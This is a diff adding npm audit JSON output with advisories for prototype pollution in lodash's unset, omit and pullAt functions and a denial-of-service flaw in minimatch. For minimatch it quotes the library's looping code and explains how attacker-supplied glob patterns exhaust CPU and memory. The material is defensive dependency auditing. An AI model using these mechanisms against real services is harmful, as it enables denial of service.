https://access.redhat.com/errata/RHSA-2026:2817\n- https://access.redhat.com/errata/RHSA-2026:2816\n- https://access.redhat.com/errata/RHSA-2026:2694\n- https://access.redhat.com/errata/RHSA-2026:2675\n- https://access.redhat.com/errata/RHSA-2026:2672\n- https://access.redhat.com/errata/RHSA-2026:2661\n- https://access.redhat.com/errata/RHSA-2026:2651\n- https://access.redhat.com/errata/RHSA-2026:25089\n- https://access.redhat.com/errata/RHSA-2026:2484\n- https://access.redhat.com/errata/RHSA-2026:2469\n- https://access.redhat.com/errata/RHSA-2026:2465\n- https://access.redhat.com/errata/RHSA-2026:2462\n- https://access.redhat.com/errata/RHSA-2026:2452\n- https://access.redhat.com/errata/RHSA-2026:2438\n- https://github.com/advisories/GHSA-xxjr-mmjv-4gpg",
+      "created": "2026-01-21T23:01:22.000Z",
+      "id": 1244531,
+      "npm_advisory_id": null,
+      "overview": "### Impact\n\nThe `_.unset`, `_.omit`, and `_.pullAt` functions are vulnerable to prototype pollution. An attacker can pass crafted paths which cause Lodash to delete methods from global prototypes.\n\nThe issue permits deletion of properties but does not allow overwriting their original behavior.\n\n### Patches\n\nThe issue is patched from 4.17.23 to 4.18.0 depending on the package: `lodash`, `lodash-es`, and `lodash-amd` in 4.17.23, and the standalone `lodash.unset` and `lodash.omit` packages in 4.18.0.\n\n### Workarounds\n\nNone. Upgrade to the patched version.",
+      "reported_by": null,
+      "title": "Lodash has Prototype Pollution Vulnerability in `_.unset`, `_.omit`, and `_.pullAt` functions",
+      "metadata": null,
+      "cves": [
+        "CVE-2025-13465"
+      ],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "lodash",
+      "vulnerable_versions": ">=4.0.0 <=4.17.22",
+      "github_advisory_id": "GHSA-xxjr-mmjv-4gpg",
+      "recommendation": "Upgrade to version 4.17.23 or later",
+      "patched_versions": ">=4.17.23",
+      "updated": "2026-11-04T03:08:57.000Z",
+      "cvss": {
+        "score": 6.5,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:L"
+      },
+      "cwe": [
+        "CWE-1321"
+      ],
+      "url": "https://github.com/advisories/GHSA-xxjr-mmjv-4gpg"
+    },
+    "1244623": {
+      "findings": [
+        {
+          "version": "9.0.9",
+          "paths": []
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/isaacs/minimatch/security/advisories/GHSA-g3hv-75wg-m249\n- https://nvd.nist.gov/vuln/detail/CVE-2026-118764\n- https://github.com/isaacs/minimatch/commit/77a0f5c4b80bdc641c3c930a1d9edf5ad2db57f8\n- https://github.com/isaacs/minimatch/releases/tag/v11.0.1\n- https://github.com/isaacs/minimatch/commit/297b6c1a01f2410b3ba1ebed14ba222d0c3c1033\n- https://github.com/isaacs/minimatch/commit/fd0b3ab9cbc5bf1aff1c99f1f46e413c2b3340da\n- https://github.com/advisories/GHSA-g3hv-75wg-m249",
+      "created": "2026-10-30T23:09:55.000Z",
+      "id": 1244623,
+      "npm_advisory_id": null,
+      "overview": "minimatch 10.2.6 contains an attacker-controlled pattern amplification in firstPhasePreProcess() when optimizationLevel >= 2.\n\nresearcher: Reid Downing (b1nv0id)\nfiles: \n\n- src/index.ts: 690-770\n- src/index.ts: 780-796\n\nissue:\ninput-controlled growth of globParts during first-phase preprocessing, followed by quadratic second-phase processing.\n\nthe **/../ transformation clones a globparts entry and appends the clone to the same globparts array:\n```\nparts.splice(gs, 1)\nconst other = parts.slice(0)\nother[gs] = '**'\nglobParts.push(other)\n```\nthis occurs inside a do...while (didSomething) fixpoint loop, allowing generated entries to be processed again.\n\nthe expanded globparts array is subsequently processed by secondPhasePreProcess(), which performs pairwise comparisons:\n```\nfor (let i = 0; i < globParts.length - 1; i++) {\n  for (let j = i + 1; j < globParts.length; j++) {\n    this.partsMatch(...)\n  }\n}\n```\nan attacker who can supply a glob pattern can therefore cause additional pattern entries to be generated during preprocessing, followed by quadratic pairwise processing, resulting in excessive cpu and memory consumption.",
+      "reported_by": null,
+      "title": "minimatch has potential denial of service via globparts amplification",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-118764"
+      ],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "minimatch",
+      "vulnerable_versions": ">=7.0.0 <11.0.1",
+      "github_advisory_id": "GHSA-g3hv-75wg-m249",
+      "recommendation": "Upgrade to version 11.0.1 or later",
+      "patched_versions": ">=11.0.1",
+      "updated": "2026-11-04T16:50:04.000Z",
+      "cvss": {
+        "score": 0,
+        "vectorString": null
+      },
+      "cwe": [
+        "CWE-405"
+      ],
+      "url": "https://github.com/advisories/GHSA-g3hv-75wg-m249"
+    }
+  },
+  "muted": [],
+  "metadata": {
+    "vulnerabilities": {
+      "info": 0,
+      "low": 8,
+      "moderate": 16,
+      "high": 13,
+      "critical": 2
+    },
+    "dependencies": 722,
+    "devDependencies": 0,
+    "optionalDependencies": 0,
+    "totalDependencies": 722
+  }
+}
